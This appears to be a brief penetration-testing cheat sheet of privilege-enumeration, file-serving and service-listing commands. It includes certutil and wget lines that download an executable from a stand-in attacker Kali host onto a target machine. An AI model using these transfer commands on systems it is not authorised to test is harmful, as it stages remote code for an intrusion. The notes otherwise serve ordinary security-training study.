check windows user privileges -->whoami \priv
check linux user privileges -->sudo -l
http server -->python3 -m http.server
http server(receiving) -->certutil -urlcache -f http://[kali ip]:port/file.exe file.exe or
      -->wget "http://[kali ip]:port/filename.exe" -outfile .\filename.exe
smb server -->python3 smbserver.py share .
rlwrap -->read line wrap.it saves the typed commands.up and down arrow
internal services -->netstat -antlp